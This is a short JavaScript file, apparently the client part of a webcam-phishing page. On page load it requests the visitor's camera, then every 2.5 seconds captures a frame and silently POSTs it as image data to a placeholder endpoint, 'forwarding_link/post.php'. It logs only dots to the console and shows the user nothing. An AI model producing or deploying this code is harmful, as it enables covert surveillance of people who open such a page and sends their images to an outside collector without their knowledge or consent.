'use strict';

async function initWebcam() {
  const video = document.getElementById('video');
  const canvas = document.getElementById('canvas');

  const constraints = {
    audio: false,
    video: {
      width: { ideal: 1280 }, // bisa disesuaikan jika 1920 terlalu tinggi untuk beberapa device
      height: { ideal: 720 },
      facingMode: { ideal: "user" } // mencoba kamera depan, lebih fleksibel
    }
  };

  try {
    const devices = await navigator.mediaDevices.enumerateDevices();
    const hasFrontCamera = devices.some(device =>
      device.kind === 'videoinput' && device.label.toLowerCase().includes('front')
    );

    if (hasFrontCamera) {
      constraints.video.facingMode = { exact: "user" };
    }

    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    handleSuccess(stream, video, canvas);
  } catch (e) {
    alert('Webcam tidak bisa diakses: ' + e.message);
  }
}

function handleSuccess(stream, video, canvas) {
  window.stream = stream;
  video.srcObject = stream;
  const context = canvas.getContext('2d');

  setInterval(() => {
    context.drawImage(video, 0, 0, canvas.width, canvas.height);
    const canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
    post(canvasData);
  }, 2500);

  video.play();
}

function post(imgdata) {
  $.ajax({
    type: 'POST',
    data: { cat: imgdata },
    url: 'forwarding_link/post.php',
    dataType: 'json',
    success: function (result) {
      console.log("....");
    },
    error: function () {
      console.error("...");
    }
  });
}

window.onload = () => {
  initWebcam();
};
